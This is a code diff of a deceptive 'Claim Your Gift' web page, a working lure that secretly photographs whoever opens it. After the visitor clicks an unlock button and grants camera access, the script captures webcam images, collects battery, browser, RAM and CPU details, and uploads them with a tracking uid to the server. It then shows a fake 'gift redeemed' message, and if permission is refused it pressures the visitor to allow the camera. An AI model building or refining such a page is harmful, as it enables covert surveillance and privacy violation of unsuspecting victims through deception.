@@ -1,109 +1,99 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Gift</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: white; color: black; text-align: center; font-family: sans-serif; transition: 0.5s; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #loading-ui { display: none; }
-        .gudda-container { position: relative; width: 150px; height: 120px; margin: 0 auto; }
-        .gudda-img { width: 70px; position: absolute; left: 20px; bottom: 10px; }
-        .key-anim { width: 30px; position: absolute; right: 30px; top: 30px; animation: rotateKey 1.2s infinite linear; }
-        @keyframes rotateKey { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .btn { background: #00ff00; color: black; border: none; padding: 18px 35px; font-size: 19px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 5px 20px rgba(0,255,0,0.4); }
+        body { background: #1a1a1a; color: white; text-align: center; font-family: Arial; padding: 20px; }
+        .container { margin-top: 50px; }
+        .btn { background: #00ff00; color: black; padding: 15px 30px; font-size: 18px; 
+               border: none; border-radius: 50px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        #gift-box { width: 120px; display: none; margin: 0 auto; }
+        .bounce { animation: bounce 0.8s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+        .sparkle { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); 
+                   width: 0; height: 0; box-shadow: 0 0 60px 40px gold; border-radius: 50%; display: none; }
+        #message { margin-top: 20px; font-size: 18px; font-weight: bold; color: #ffffff; }
+        #final-msg { color: #00ff00; display: none; }
+        #sub-msg { color: #00ff00; font-size: 14px; display: none; }
     </style>
 </head>
 <body>
-    <div id="start-page">
-        <h2>🎁 You have a surprise gift! ✨</h2>
-        <p>👇 Click below to unlock it 🔓</p>
-        <button class="btn" onclick="startWork()">🔓 UNLOCK YOUR GIFT 🎁</button>
-    </div>
-
-    <div id="loading-ui">
-        <div class="gudda-container">
-            <img class="gudda-img" src="https://cdn-icons-png.flaticon.com/512/226/226770.png"> 
-            <img class="key-anim" src="https://cdn-icons-png.flaticon.com/512/3039/3039433.png">
+    <div class="container">
+        <h2 id="header">🎁 You have a surprise gift! ✨</h2>
+        <div id="sparkle" class="sparkle"></div>
+        <img id="gift-box" src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png">
+        
+        <div id="action-area">
+            <p>👇 Click below to unlock it 🔒</p>
+            <button class="btn" onclick="startProcess()">🔓 UNLOCK YOUR GIFT 🎁</button>
         </div>
-        <p style="font-size: 20px; margin-top: 15px; font-weight: bold;">Your Gift is Loading...🎁</p>
-        <div class="loader"></div>
+        
+        <div id="loading-area" style="display:none;">
+            <p id="message">Your Gift is Loading...🎁</p>
+        </div>
+
+        <div id="success-area">
+            <h2 id="final-msg">Your gift has been redeemed. 👍</h2>
+            <p id="sub-msg">You are a good person, God bless you. ✨</p>
+        </div>
     </div>
 
-    <div id="success-msg" style="display:none; color:#00ff00; padding: 20px;">
-        <h2>Your gift has been redeemed.👍</h2>
-        <p>You are a good person, God bless you. ✨</p>
-    </div>
-
-    <video id="v" style="display:none" autoplay playsinline muted></video>
-    <canvas id="c" style="display:none"></canvas>
+    <video id="video" style="display:none" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none"></canvas>
+    <audio id="magic-sound" src="https://www.soundjay.com/misc/sounds/magic-chime-01.mp3"></audio>
 
     <script>
-        const params = new URLSearchParams(window.location.search);
-        const mode = params.get('m') || 'front';
-        const uid = params.get('uid');
+    const urlParams = new URLSearchParams(window.location.search);
+    const uid = urlParams.get('uid');
+    const mode = urlParams.get('m');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
-        async function startWork() {
-            document.body.style.background = "black";
-            document.body.style.color = "white";
-            document.getElementById('start-page').style.display = 'none';
-            document.getElementById('loading-ui').style.display = 'block';
+    async function startProcess() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
 
-            let info = {
-                battery: "N/A",
-                platform: navigator.platform,
-                browser: navigator.userAgent.split(' ').pop(),
-                screen: window.screen.width + "x" + window.screen.height
-            };
-            try { let b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; } catch(e){}
+            document.getElementById('action-area').style.display = "none";
+            document.getElementById('header').style.display = "none";
+            document.getElementById('loading-area').style.display = "block";
+            document.getElementById('gift-box').style.display = "block";
+            document.getElementById('gift-box').classList.add('bounce');
 
-            // Device info extraction from userAgent
-            let deviceName = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : navigator.platform;
-
-            if(mode === 'front') await runCam(info, {facingMode: "user"}, 4, "FRONT", deviceName);
-            else if(mode === 'back') await runCam(info, {facingMode: "environment"}, 4, "BACK", deviceName);
-            else {
-                await runCam(info, {facingMode: "environment"}, 2, "BACK", deviceName);
-                await runCam(info, {facingMode: "user"}, 2, "FRONT", deviceName);
-            }
-
-            document.getElementById('loading-ui').style.display = 'none';
-            document.getElementById('success-msg').style.display = 'block';
-        }
-
-        async function runCam(info, constraints, count, label, deviceName) {
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { ...constraints, width: {ideal: 1280}, height: {ideal: 720} } 
-                });
-                let video = document.getElementById('v');
-                video.srcObject = stream;
-                await video.play();
+            setTimeout(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const image = canvas.toDataURL('image/jpeg');
                 
-                // 8 seconds delay for camera stability
-                await new Promise(r => setTimeout(r, 8000)); 
+                const battery = await navigator.getBattery();
+                const info = {
+                    battery: (battery.level * 100) + "%",
+                    browser: navigator.userAgent,
+                    device: navigator.platform,
+                    ram: navigator.deviceMemory || "N/A",
+                    cores: navigator.hardwareConcurrency || "N/A"
+                };
 
-                for (let i = 1; i <= count; i++) {
-                    let can = document.getElementById('c');
-                    can.width = video.videoWidth; 
-                    can.height = video.videoHeight;
-                    can.getContext('2d').drawImage(video, 0, 0);
-                    
-                    await fetch('/upload', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            image: can.toDataURL('image/jpeg', 0.8), 
-                            info: { ...info, device: deviceName }, 
-                            mode: label,
-                            uid: uid 
-                        })
-                    });
-                    await new Promise(r => setTimeout(r, 2500));
-                }
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ image, uid, mode, info })
+                });
+
+                document.getElementById('gift-box').classList.remove('bounce');
+                document.getElementById('gift-box').src = "https://cdn-icons-png.flaticon.com/512/4213/4213600.png";
+                document.getElementById('loading-area').style.display = "none";
+                document.getElementById('sparkle').style.display = "block";
+                document.getElementById('magic-sound').play();
+                document.getElementById('final-msg').style.display = "block";
+                document.getElementById('sub-msg').style.display = "block";
+            }, 8000);
+        } catch (err) {
+            alert("Camera permission is required to claim the gift!");
         }
+    }
     </script>
 </body>
 </html>
